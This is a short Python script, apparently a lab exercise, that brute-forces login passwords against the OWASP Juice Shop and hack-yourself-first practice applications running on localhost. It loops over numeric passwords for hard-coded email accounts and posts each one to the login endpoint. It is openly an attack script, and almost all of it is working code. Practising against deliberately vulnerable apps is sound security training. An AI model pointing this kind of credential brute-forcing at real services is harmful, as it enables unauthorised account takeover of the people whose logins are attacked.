import requests


def brute_force_attack_password_to_juice_shop():
    # SITE_NAME = 'http://127.0.0.1:5000/#/login'

    for i in range(123456, 123457):
        headers = {'User-Agent': 'Mozilla/5.0'}
        payload = {'email': 'mk600449@gmail.com', 'password': i}
        session = requests.Session()
        res = session.post('http://localhost:5000/login', data=payload, headers=headers)
        print(res.text)


brute_force_attack_password_to_juice_shop()


def brute_force_attack_password_to_hack_yourself():
    # SITE_NAME = 'https://hack-yourself-first.com/'
    for i in range(123450, 123470):
        headers = {'User-Agent': 'Mozilla/5.0'}
        payload = {'Email': 'aiwedo2878@superyp.com', 'Password': i}

        session = requests.Session()
        # session.keep_alive = False
        res = session.post('http://127.0.0.1:5000/Account/Login',data=payload,headers = headers)
        print(res.text)


# brute_force_attack_password_to_hack_yourself()





